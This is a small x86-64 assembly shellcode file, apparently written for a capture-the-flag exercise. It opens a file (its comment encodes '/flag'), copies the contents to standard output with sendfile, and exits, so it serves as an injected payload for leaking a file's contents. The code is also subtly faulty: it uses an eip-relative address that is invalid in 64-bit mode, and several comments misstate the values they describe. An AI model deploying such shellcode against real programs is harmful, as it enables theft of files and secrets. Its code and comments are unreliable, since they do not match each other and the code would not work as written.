.global _start
_start:
.intel_syntax noprefix

# 0x67616c662f

xor eax, eax            # clear eax
lea ebx, [eip + flag]   # calculate flag position
mov al, 2               # rax = 2 (open)
mov edi, ebx            # mov pointer to flag string into rdi
xor esi, esi            # rsi = 0
syscall

xor edi, edi            # rdi = 0
mov dil, 1              # rdi = 0x1 {1}
mov esi, eax            # file descriptor from rax {2}
xor edx, edx            # rdx = 0 (bytes to skip) {3}
mov r10w, 1000          # r10 = 0x1000 (bytes to read) {4}
xor eax, eax            # clear rax
mov al, 40              # rax = 0x40 (syscall for sendfile)
syscall                 # sendfile(1, file, 0, 1000)

xor eax, eax            # clear rax
mov al, 60              # rax = 60 (exit)
syscall                 # exit()

flag:
.string "???"
